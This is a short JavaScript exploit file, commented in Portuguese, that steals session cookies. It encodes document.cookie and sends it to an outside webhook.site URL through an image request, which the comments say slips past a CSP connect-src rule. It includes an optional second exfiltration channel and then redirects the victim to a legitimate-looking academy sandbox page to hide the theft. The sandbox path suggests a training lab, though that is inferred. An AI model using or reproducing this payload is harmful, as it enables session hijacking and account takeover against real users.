// exploit.js — exfiltração furtiva + cloaking
(function () {
  var cookie = encodeURIComponent(document.cookie);
  var webhook = 'https://webhook.site/9987267d-7243-4e76-b9a4-36ea4b7303e4';

  // 1. Exfiltra via <img> (img-src https: permite; connect-src não interfere)
  new Image().src = webhook + '?c=' + cookie;

  // 2. Redundância: segundo canal (outro UUID do Webhook.site, se quiser)
  // new Image().src = 'https://webhook.site/OUTRO-UUID?c=' + cookie;

  // 3. Cloaking: espera 300ms e devolve o usuário para a página legítima
  setTimeout(function () {
    window.location.href = 'https://sandbox.datacentrics.com.br/academy/ntsec/';
  }, 300);
})();
